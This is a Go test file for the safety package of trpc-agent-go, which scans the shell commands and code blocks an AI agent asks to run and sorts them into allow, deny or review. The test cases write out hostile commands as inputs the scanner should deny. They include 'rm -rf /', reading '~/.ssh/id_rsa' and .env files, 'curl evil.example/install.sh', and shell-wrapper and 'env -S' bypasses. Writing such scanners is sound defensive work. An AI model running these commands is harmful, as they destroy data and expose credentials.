//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestScanRequiredSamples(t *testing.T) {
	policy := DefaultPolicy()
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "safe go test",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "go test ./...",
			},
			decision: DecisionAllow,
		},
		{
			name: "dangerous delete",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "rm -rf /",
			},
			decision: DecisionDeny,
			ruleID:   "dangerous.rm_rf",
		},
		{
			name: "read key",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.path_access",
		},
		{
			name: "non whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://evil.example/install.sh",
			},
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name: "whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
			},
			decision: DecisionAllow,
		},
		{
			name: "shell wrapper bypass",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "bash -c 'curl https://evil.example/x'",
			},
			decision: DecisionDeny,
			ruleID:   "shell.bypass",
		},
		{
			name: "pipeline command",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat README.md | wc -l",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "shell.pipeline_review",
		},
		{
			name: "dependency install",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "npm install left-pad",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "dependency.environment_change",
		},
		{
			name: "long running sleep",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "sleep 9999",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "resource.long_sleep",
		},
		{
			name: "large output",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "yes x | head -c 9999999",
			},
			decision: DecisionDeny,
			ruleID:   "resource.large_output",
		},
		{
			name: "hostexec long session",
			req: Request{
				ToolName:   "exec_command",
				Backend:    BackendHostExec,
				Command:    "tail -f app.log",
				TTY:        true,
				Background: true,
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "hostexec.long_session",
		},
		{
			name: "ask human review",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "python -c 'import subprocess; subprocess.run([\"go\", \"test\", \"./...\"])'",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "import subprocess; subprocess.run(['go', 'test', './...'])",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "codeexec.host_command_bridge",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, policy)
			if report.Decision != tt.decision {
				t.Fatalf("decision = %q, want %q; report: %+v",
					report.Decision, tt.decision, report)
			}
			if tt.ruleID != "" && report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
			if err := ValidateReport(report); err != nil {
				t.Fatalf("report missing required fields: %v", err)
			}
		})
	}
}

func TestLoadPolicyChangesNetworkAllowlistWithoutCode(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
network_allowlist:
  - example.com
denied_paths:
  - .env
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://example.com/file",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://api.github.com/repos/x/y",
	}, policy)
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisablePipelineReview(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
review_shell_pipelines: false
allowed_commands:
  - cat
  - wc
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisableParseErrorDeny(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.json")
	content := []byte(`{
  "deny_on_parse_error": false,
  "allowed_commands": ["echo"]
}`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo 'unterminated",
	}, policy)
	if report.Decision != DecisionAsk || report.RuleID != "shellsafe.parse_error" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestAllowedCommandsRequireExactExecutable(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"go"}

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "./go version",
	}, policy)
	if report.Decision != DecisionDeny ||
		report.RuleID != "policy.command_not_allowed" {
		t.Fatalf("workspace-relative executable should not match bare allow entry: %+v", report)
	}
}

func TestAllowedCommandsAreCaseSensitiveOutsideWindows(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows executable lookup is case-insensitive")
	}
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"go"}

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "GO version",
	}, policy)
	if report.Decision != DecisionDeny ||
		report.RuleID != "policy.command_not_allowed" {
		t.Fatalf("allow entry should preserve executable case: %+v", report)
	}
}

func TestNetworkCommandsAtPathsRejectSchemeLessTarget(t *testing.T) {
	commands := []string{
		"/usr/bin/curl evil.example/install.sh",
		"./curl evil.example/install.sh",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "network.non_whitelisted_domain" {
				t.Fatalf("scheme-less non-allowlisted target should be denied: %+v", report)
			}
		})
	}
}

func TestWrappedNetworkCommandsRejectSchemeLessTarget(t *testing.T) {
	commands := []string{
		"env curl evil.example/install.sh",
		"command curl evil.example/install.sh",
		"timeout 5 curl evil.example/install.sh",
		"nice curl evil.example/install.sh",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "network.non_whitelisted_domain" {
				t.Fatalf("wrapped network command should be denied: %+v", report)
			}
		})
	}
}

func TestNetworkCommandsRejectLoopbackTargets(t *testing.T) {
	commands := []string{
		"/usr/bin/curl 127.0.0.1",
		"/usr/bin/curl localhost",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "network.non_whitelisted_domain" {
				t.Fatalf("loopback network target should be denied: %+v", report)
			}
		})
	}
}

func TestGitNetworkOperationsValidateRemoteHost(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		decision Decision
		ruleID   string
	}{
		{
			name:     "deny SCP-like SSH remote",
			command:  "git clone git@evil.example:org/repo",
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name:     "allow whitelisted SCP-like SSH remote",
			command:  "git clone git@github.com:trpc-group/trpc-agent-go.git",
			decision: DecisionAllow,
		},
		{
			name:     "review unresolved remote alias",
			command:  "git fetch origin",
			decision: DecisionNeedsHumanReview,
			ruleID:   "network.unresolved_target",
		},
		{
			name:     "allow local operation",
			command:  "git status",
			decision: DecisionAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.command,
			}, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected Git network report: %+v", report)
			}
		})
	}
}

func TestEnvSplitStringFailsClosed(t *testing.T) {
	commands := []string{
		"env -S 'rm -rf /'",
		"env --split-string 'curl evil.example'",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "shell.env_split_string" {
				t.Fatalf("env split-string payload should fail closed: %+v", report)
			}
		})
	}
}

func TestDeniedPathsIncludeOptionValuesAndDotenvVariants(t *testing.T) {
	commands := []string{
		"node --env-file=.env app.js",
		"app --config=/etc/secrets",
		"cat production.env",
		"cat .env.production",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				!reportHasRule(report, "sensitive.path_access") {
				t.Fatalf("sensitive path should be denied: %+v", report)
			}
		})
	}
}

func TestMultilineBashCodeDoesNotReportParseError(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "go test ./...\ngo vet ./...",
		}},
	}, DefaultPolicy())
	if reportHasRule(report, "shellsafe.parse_error") {
		t.Fatalf("valid multiline bash should not produce a parse error: %+v", report)
	}
}

func TestMultilineBashAfterEscapedQuoteRejectsNetworkTarget(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "echo \"say \\\"hello\"\ncurl evil.example/install.sh",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionDeny ||
		report.RuleID != "network.non_whitelisted_domain" {
		t.Fatalf("network command after escaped quote should be denied: %+v", report)
	}
}

func TestShellBypassRedirectsRespectQuotes(t *testing.T) {
	for _, command := range []string{
		`echo "1 > 0"`,
		`echo '1 < 2'`,
	} {
		t.Run("quoted "+command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if reportHasRule(report, "shell.bypass") {
				t.Fatalf("quoted redirect character should be literal: %+v", report)
			}
		})
	}

	for _, command := range []string{
		"echo ok > output.txt",
		"cat < input.txt",
	} {
		t.Run("unquoted "+command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				!reportHasRule(report, "shell.bypass") {
				t.Fatalf("unquoted redirect should be denied as a shell bypass: %+v", report)
			}
		})
	}
}

func TestPolicyZeroValueKeepsConservativeDefaults(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, Policy{})
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "shell.pipeline_review" {
		t.Fatalf("zero-value policy should inherit pipeline review: %+v", report)
	}
}

func TestDefaultPolicyPreservesProgrammaticFalseOverrides(t *testing.T) {
	policy := DefaultPolicy()
	policy.ReviewShellPipelines = false
	policy.DenyOnParseError = false

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("pipeline decision = %q, want allow; report: %+v", report.Decision, report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo 'unterminated",
	}, policy)
	if report.Decision != DecisionAsk {
		t.Fatalf("parse decision = %q, want ask; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyErrors(t *testing.T) {
	if _, err := LoadPolicy(filepath.Join(t.TempDir(), "missing.yaml")); err == nil {
		t.Fatal("LoadPolicy missing file error = nil")
	}

	badJSON := filepath.Join(t.TempDir(), "bad.json")
	if err := os.WriteFile(badJSON, []byte(`{`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(badJSON); err == nil {
		t.Fatal("LoadPolicy bad JSON error = nil")
	}

	badExt := filepath.Join(t.TempDir(), "policy.toml")
	if err := os.WriteFile(badExt, []byte(`allowed_commands = []`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(badExt); err == nil {
		t.Fatal("LoadPolicy unsupported extension error = nil")
	}
}

func TestPermissionPolicyBlocksAndAudits(t *testing.T) {
	args := []byte(`{"command":"cat .env","timeout_sec":10}`)
	var audit bytes.Buffer
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(audit.Bytes()), &event); err != nil {
		t.Fatalf("audit was not json: %v\n%s", err, audit.String())
	}
	if event.ToolName != "workspace_exec" ||
		event.Decision != DecisionDeny ||
		event.RuleID != "sensitive.path_access" ||
		!event.Blocked {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyMapsReviewToAsk(t *testing.T) {
	args := []byte(`{"command":"npm install left-pad"}`)
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAsk {
		t.Fatalf("action = %q, want ask", decision.Action)
	}
}

func TestPermissionPolicyUsesExtensionRequestParser(t *testing.T) {
	parserCalled := false
	policy := NewPermissionPolicy(
		DefaultPolicy(),
		WithPermissionRequestParser(
			"mcp_shell",
			func(req *tool.PermissionRequest) (Request, bool, error) {
				parserCalled = true
				return Request{
					ToolName: req.ToolName,
					Backend:  "mcp",
					Command:  "cat .env",
				}, true, nil
			},
		),
	)
	decision, err := policy.CheckToolPermission(
		context.Background(),
		&tool.PermissionRequest{ToolName: "mcp_shell"},
	)
	if err != nil {
		t.Fatal(err)
	}
	if !parserCalled || decision.Action != tool.PermissionActionDeny {
		t.Fatalf("parserCalled = %v, decision = %+v", parserCalled, decision)
	}
}

func TestPermissionPolicyAllowsUnknownToolAndNilRequest(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("nil request action = %q, want allow", decision.Action)
	}

	decision, err = policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "unknown_tool",
		Arguments: []byte(`{}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("unknown tool action = %q, want allow", decision.Action)
	}
}

func TestPermissionPolicyInvalidArgsDeny(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "invalid args") {
		t.Fatalf("unexpected decision: %+v", decision)
	}
}

func TestPermissionPolicyAuditPath(t *testing.T) {
	path := filepath.Join(t.TempDir(), "audit.jsonl")
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditPath(path))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"cat .env"}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(b), &event); err != nil {
		t.Fatalf("audit file was not json: %v\n%s", err, string(b))
	}
	if event.RuleID != "sensitive.path_access" {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyAuditWriterError(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(errorWriter{}))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err == nil {
		t.Fatal("CheckToolPermission audit writer error = nil")
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("audit writer error action = %q, want deny", decision.Action)
	}
}

func TestPermissionPolicyConcurrentAuditWritesCompleteJSONL(t *testing.T) {
	const requestCount = 64

	var audit bytes.Buffer
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
	start := make(chan struct{})
	results := make(chan struct {
		decision tool.PermissionDecision
		err      error
	}, requestCount)
	var wg sync.WaitGroup
	for i := 0; i < requestCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-start
			decision, err := policy.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "workspace_exec",
					Arguments: []byte(`{"command":"go test ./..."}`),
				},
			)
			results <- struct {
				decision tool.PermissionDecision
				err      error
			}{decision: decision, err: err}
		}()
	}
	close(start)
	wg.Wait()
	close(results)

	for result := range results {
		if result.err != nil {
			t.Fatalf("CheckToolPermission() error = %v", result.err)
		}
		if result.decision.Action != tool.PermissionActionAllow {
			t.Fatalf("action = %q, want allow", result.decision.Action)
		}
	}

	lines := bytes.Split(bytes.TrimSpace(audit.Bytes()), []byte{'\n'})
	if len(lines) != requestCount {
		t.Fatalf("audit lines = %d, want %d", len(lines), requestCount)
	}
	for i, line := range lines {
		var event AuditEvent
		if err := json.Unmarshal(line, &event); err != nil {
			t.Fatalf("audit line %d was not complete JSON: %v\n%s", i, err, line)
		}
		if event.ToolName != "workspace_exec" || event.Decision != DecisionAllow {
			t.Fatalf("unexpected audit event on line %d: %+v", i, event)
		}
	}
}

func TestNilPermissionPolicyFailsClosed(t *testing.T) {
	var policy *PermissionPolicy
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
}

func TestPermissionPolicyAllowsNullCodeBlocksNoop(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":null}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("action = %q, want allow", decision.Action)
	}
}

func TestPermissionPolicyAllowsCodeExecBlocksAndDeniesBadBlocks(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":[{"language":"python","code":"print(1)"}]}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("valid code block action = %q, want allow", decision.Action)
	}

	decision, err = policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":42}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "code_blocks") {
		t.Fatalf("bad code block decision = %+v, want deny with code_blocks reason", decision)
	}
}

func TestRequestFromPermissionRequestParsesExecMetadata(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName: "exec_command",
		Arguments: []byte(`{
			"command":"go test ./...",
			"workdir":"/tmp/work",
			"env":{"PATH":"/bin"},
			"background":true,
			"timeoutSec":12,
			"pty":true
		}`),
		Metadata: tool.ToolMetadata{Destructive: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.Backend != BackendHostExec || req.Cwd != "/tmp/work" ||
		req.TimeoutSeconds != 12 || !req.Background || !req.TTY ||
		!req.Metadata.Destructive || req.Env["PATH"] != "/bin" {
		t.Fatalf("unexpected request: %+v", req)
	}
}

func TestRequestFromPermissionRequestParsesTTYAndTimeoutSec(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName: "workspace_exec",
		Arguments: []byte(`{
			"command":"go test ./...",
			"cwd":".",
			"timeout_sec":7,
			"tty":true
		}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.Backend != BackendWorkspaceExec || req.Cwd != "." ||
		req.TimeoutSeconds != 7 || !req.TTY {
		t.Fatalf("unexpected request: %+v ok=%v", req, ok)
	}
}

func TestRequestFromPermissionRequestUsesDeclarationName(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		Declaration: &tool.Declaration{Name: "workspace_exec"},
		Arguments:   []byte(`{"command":"go test ./...","cwd":"."}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.ToolName != "workspace_exec" || req.Command != "go test ./..." ||
		req.Cwd != "." || req.Backend != BackendWorkspaceExec {
		t.Fatalf("unexpected request: %+v ok=%v", req, ok)
	}
}

func TestParseCodeBlocksVariants(t *testing.T) {
	blocks, err := parseCodeBlocks(json.RawMessage(`{"language":"python","code":"print(1)"}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(blocks) != 1 || blocks[0].Language != "python" {
		t.Fatalf("unexpected object blocks: %+v", blocks)
	}

	inner := `[{"language":"bash","code":"echo ok"}]`
	blocks, err = parseCodeBlocks(json.RawMessage(strconvQuote(inner)))
	if err != nil {
		t.Fatal(err)
	}
	if len(blocks) != 1 || blocks[0].Language != "bash" {
		t.Fatalf("unexpected string blocks: %+v", blocks)
	}

	if _, err := parseCodeBlocks(json.RawMessage(`"not-json"`)); err == nil {
		t.Fatal("parseCodeBlocks invalid string error = nil")
	}
	if _, err := parseCodeBlocks(json.RawMessage(`42`)); err == nil {
		t.Fatal("parseCodeBlocks scalar error = nil")
	}
	if _, err := parseCodeBlocks(json.RawMessage(`[{"language":42}]`)); err == nil {
		t.Fatal("parseCodeBlocks malformed array error = nil")
	}
}

func TestScanRedactsSecrets(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo OPENAI_API_KEY=sk-1234567890abcdef",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", report.Decision)
	}
	if !report.Redacted {
		t.Fatalf("report should indicate redaction")
	}
	raw, _ := json.Marshal(report)
	if bytes.Contains(raw, []byte("sk-1234567890abcdef")) {
		t.Fatalf("report leaked secret: %s", raw)
	}
}

func TestScanMetadataEnvAndTelemetry(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
		Metadata: ToolMetadata{Destructive: true},
		Env: map[string]string{
			"PATH":    "/bin",
			"BAD_ENV": "1",
		},
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "tool.metadata_destructive" {
		t.Fatalf("unexpected report: %+v", report)
	}
	attrs := report.SpanAttributes()
	if attrs["tool.safety.decision"] != string(report.Decision) ||
		attrs["tool.safety.risk_level"] != string(report.RiskLevel) ||
		attrs["tool.safety.rule_id"] != report.RuleID ||
		attrs["tool.safety.backend"] != report.Backend {
		t.Fatalf("unexpected span attrs: %+v", attrs)
	}
	if len(report.Findings) < 2 {
		t.Fatalf("expected metadata and env findings: %+v", report.Findings)
	}
}

func TestValidateReportMissingFields(t *testing.T) {
	tests := []struct {
		name   string
		report Report
		want   string
	}{
		{
			name:   "decision",
			report: Report{},
			want:   "missing decision",
		},
		{
			name:   "risk",
			report: Report{Decision: DecisionAllow},
			want:   "missing risk_level",
		},
		{
			name: "rule",
			report: Report{
				Decision:       DecisionDeny,
				RiskLevel:      RiskHigh,
				Recommendation: "fix it",
			},
			want: "missing rule_id",
		},
		{
			name: "evidence",
			report: Report{
				Decision:       DecisionDeny,
				RiskLevel:      RiskHigh,
				RuleID:         "rule",
				Recommendation: "fix it",
			},
			want: "missing evidence",
		},
		{
			name: "recommendation",
			report: Report{
				Decision:  DecisionAllow,
				RiskLevel: RiskLow,
			},
			want: "missing recommendation",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateReport(tt.report)
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("ValidateReport() error = %v, want %q", err, tt.want)
			}
		})
	}
}

func TestScanDeniedCWD(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "ls",
		Cwd:      "~/.ssh",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanDeniedRootPath(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
		Cwd:      "/",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("root cwd should be denied: %+v", report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat /",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.path_access" {
		t.Fatalf("root path argument should be denied: %+v", report)
	}
}

func TestScanAdditionalRuleBranches(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		ruleID string
	}{
		{
			name:   "recursive chmod",
			cmd:    "chmod -R 777 .",
			ruleID: "dangerous.recursive_chmod",
		},
		{
			name:   "network command without target",
			cmd:    "curl --head",
			ruleID: "network.unresolved_target",
		},
		{
			name:   "python large output",
			cmd:    "python -c 'print(\"x\" * 9999999)'",
			ruleID: "resource.large_output",
		},
		{
			name:   "parallel high concurrency",
			cmd:    "parallel -j 64 echo ::: a b c",
			ruleID: "resource.high_concurrency",
		},
		{
			name:   "infinite loop",
			cmd:    "for ;; do echo x; done",
			ruleID: "resource.infinite_loop",
		},
		{
			name:   "windows system path delete",
			cmd:    "rm -r C:/Windows",
			ruleID: "dangerous.rm_rf",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.cmd,
			}, DefaultPolicy())
			if report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
		})
	}
}

func TestScanCodeExecAppliesRequestEnvelope(t *testing.T) {
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "denied cwd",
			req: Request{
				ToolName: "execute_code",
				Backend:  BackendCodeExec,
				Cwd:      "/",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.cwd_access",
		},
		{
			name: "timeout exceeded",
			req: Request{
				ToolName:       "execute_code",
				Backend:        BackendCodeExec,
				TimeoutSeconds: DefaultPolicy().MaxTimeoutSeconds + 1,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "resource.timeout_exceeded",
		},
		{
			name: "output exceeded",
			req: Request{
				ToolName:       "execute_code",
				Backend:        BackendCodeExec,
				MaxOutputBytes: DefaultPolicy().MaxOutputBytes + 1,
